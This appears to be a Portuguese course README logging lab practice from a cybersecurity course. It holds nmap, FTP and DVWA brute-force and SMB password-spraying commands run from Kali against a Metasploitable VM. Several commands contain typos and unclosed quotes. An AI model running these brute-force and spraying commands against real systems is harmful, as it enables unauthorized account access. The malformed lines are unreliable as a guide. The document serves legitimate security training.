# DIO_Santander_CyberSecurity_2025 <br>
Repositório das práticas executadas no Curso Santander Cyber Security 2025 <br>



# Introdução sobre principais ferramentas abordadas no curso:

-Hydra <br>
-ncrack <br>
-john <br>
-wpscan <br>
-patator <br>



# Feito o provisionamento das VMs em VirtualBox dos sistemas utilizados no curso:

-Kali Linux <br>
-Metasploitable 2.0 <br>



# Executados ataques simulados no Metasploitable 2.0 utilizando o Kali Linux 2025

-Varredura de portas abertas com o NMAP <br>
-Ataque de força bruta em FTP <br>
-Automação de tentativas em formulário web (DVWA) <br>
-Password spraying em SMB com enumeração de usuários. <br>



# Comandos Executados:
ping -c 3 192.168.56.102 <br>
nmap -sV -p 21,22,80,445,139 192.168.56.102 <br>
ftp 192.168.56.102 <br>
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt <br>
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt <br>
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6 <br>
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6 <br>


medusa -h 192.168.56.102 -:U users.txt -P pass.txt -M http \ <br>
-m PAGE'/dvwa/login.php'\ <br>
-m FORM'username=^USER^&password=^PASS^&login=Login' \ <br>
-m 'FAIL=Login failed' -t 6 <br>


emu4linux -a 192.168.56.102 |tee enum4_output.txt <br>
less enum4_output.txt <br>
echo -e "user\nmsfadmin\nservice > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin > senhas_spray.txt
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -2 2 -T 50
smbclient -L 192.168.56.102 -U msfadmin
